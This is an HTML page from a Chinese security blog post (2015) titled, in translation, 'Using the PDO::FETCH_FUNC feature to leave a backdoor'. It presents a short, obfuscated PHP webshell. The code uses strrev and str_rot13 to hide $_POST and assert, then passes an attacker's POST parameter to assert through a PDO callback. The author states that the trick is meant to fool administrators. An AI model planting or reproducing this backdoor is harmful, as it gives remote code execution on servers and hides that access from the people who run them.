@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="翻手册的时候发现fetch_argument的参数PDO::FETCH_FUNC可以回调一个函数，用这东西留个后门应该可以迷惑部分管理员。  适用于：(PHP 5 &amp;gt;= 5.1.0, PECL pdo &amp;gt;= 0.1.0)。12345678&amp;lt;?phpif(($db = @new PDO(&apos;sqlite::memory:&apos;)) &amp;amp;&amp;amp; ($sql = strrev(&apos;T">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用PDO::FETCH_FUNC特性留后门">
+<meta property="og:url" content="http://secoff.net/archives/436.html">
+<meta property="og:site_name" content="Security Off">
+<meta property="og:description" content="翻手册的时候发现fetch_argument的参数PDO::FETCH_FUNC可以回调一个函数，用这东西留个后门应该可以迷惑部分管理员。  适用于：(PHP 5 &amp;gt;= 5.1.0, PECL pdo &amp;gt;= 0.1.0)。12345678&amp;lt;?phpif(($db = @new PDO(&apos;sqlite::memory:&apos;)) &amp;amp;&amp;amp; ($sql = strrev(&apos;T">
+<meta property="og:updated_time" content="2017-08-02T02:26:36.809Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用PDO::FETCH_FUNC特性留后门">
+<meta name="twitter:description" content="翻手册的时候发现fetch_argument的参数PDO::FETCH_FUNC可以回调一个函数，用这东西留个后门应该可以迷惑部分管理员。  适用于：(PHP 5 &amp;gt;= 5.1.0, PECL pdo &amp;gt;= 0.1.0)。12345678&amp;lt;?phpif(($db = @new PDO(&apos;sqlite::memory:&apos;)) &amp;amp;&amp;amp; ($sql = strrev(&apos;T">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    
+    <title>利用PDO::FETCH_FUNC特性留后门 | Security Off</title>
+    
+
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post" style="padding:40px;">
+<div id="nav" class="pull-right">
+  <ul>
+     <li class="icon">
+        <a href="javascript:history.go(-1)" title="Back"><i class="fa fa-mail-reply fa-5x"></i></a>
+     </li>
+  </ul>
+</div>
+  <!--
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  -->
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/archives/461.html"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/archives/414.html"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/436.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/436.html&text=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/436.html&is_video=false&description=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用PDO::FETCH_FUNC特性留后门&body=Check out this article: http://secoff.net/archives/436.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/436.html&name=利用PDO::FETCH_FUNC特性留后门&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#适用于：-PHP-5-gt-5-1-0-PECL-pdo-gt-0-1-0-。"><span class="toc-number">1.</span> <span class="toc-text">适用于：(PHP 5 >= 5.1.0, PECL pdo >= 0.1.0)。</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    
+    <div class="content index width mx-auto px2 my4" style="max-width:58rem">
+    
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        利用PDO::FETCH_FUNC特性留后门
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Security Off</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2015-06-16T10:44:12.000Z" itemprop="datePublished">2015-06-16</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>翻手册的时候发现fetch_argument的参数PDO::FETCH_FUNC可以回调一个函数，用这东西留个后门应该可以迷惑部分管理员。</p>
+
+<h3 id="适用于：-PHP-5-gt-5-1-0-PECL-pdo-gt-0-1-0-。"><a href="#适用于：-PHP-5-gt-5-1-0-PECL-pdo-gt-0-1-0-。" class="headerlink" title="适用于：(PHP 5 &gt;= 5.1.0, PECL pdo &gt;= 0.1.0)。"></a>适用于：(PHP 5 &gt;= 5.1.0, PECL pdo &gt;= 0.1.0)。</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(($db = @<span class="keyword">new</span> PDO(<span class="string">'sqlite::memory:'</span>)) &amp;&amp; ($sql = strrev(<span class="string">'TSOP_'</span>)) &amp;&amp; ($sql = $$sql)) &#123;</div><div class="line">	$stmt = @$db-&gt;query(<span class="string">"SELECT '&#123;$sql[b4dboy]&#125;'"</span>);</div><div class="line">	$result = @$stmt-&gt;fetchAll(PDO::FETCH_FUNC, str_rot13(<span class="string">'nffreg'</span>));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#适用于：-PHP-5-gt-5-1-0-PECL-pdo-gt-0-1-0-。"><span class="toc-number">1.</span> <span class="toc-text">适用于：(PHP 5 >= 5.1.0, PECL pdo >= 0.1.0)。</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://secoff.net/archives/436.html"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://secoff.net/archives/436.html&text=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://secoff.net/archives/436.html&is_video=false&description=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用PDO::FETCH_FUNC特性留后门&body=Check out this article: http://secoff.net/archives/436.html"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://secoff.net/archives/436.html&title=利用PDO::FETCH_FUNC特性留后门"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://secoff.net/archives/436.html&name=利用PDO::FETCH_FUNC特性留后门&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    
+<div class="content index width mx-auto px2 my4" style="max-width:58rem">
+<footer id="footer" style="max-width:58rem">
+
+  <div class="footer-left">
+    Copyright &copy; 2017 b4dboy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Index</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
